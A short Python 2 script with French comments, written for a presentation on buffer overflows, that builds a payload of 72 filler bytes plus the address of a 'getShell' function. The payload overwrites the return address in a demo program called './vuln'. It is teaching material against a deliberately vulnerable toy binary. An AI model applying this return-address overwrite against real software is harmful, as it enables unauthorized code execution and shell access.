#-*- coding: utf-8 -*-
# exploit.py --- 
# 
# Filename: exploit.py
# Description: exploit pour la presentation cyber sur les buffer overflow
# Author: guillaume
# Maintainer: 
# Created: mar. avril 18 16:15:29 2017 (+0200)
# Last-Updated: 
#           By: 
#     Update #: 0

# Code:

import struct

''' adresse de la fonction getShell '''
addr_fonction=0x0000000000400630

''' a partir de 72 caractère on réécris l'adresse de retour de la fonction vuln() '''
offset = 72


payload ='A' * offset 
payload += struct.pack('<Q',addr_fonction)


''' exploit with :
$~ python exploit.py|./vuln 
'''
print payload


# 
# exploit.py ends here
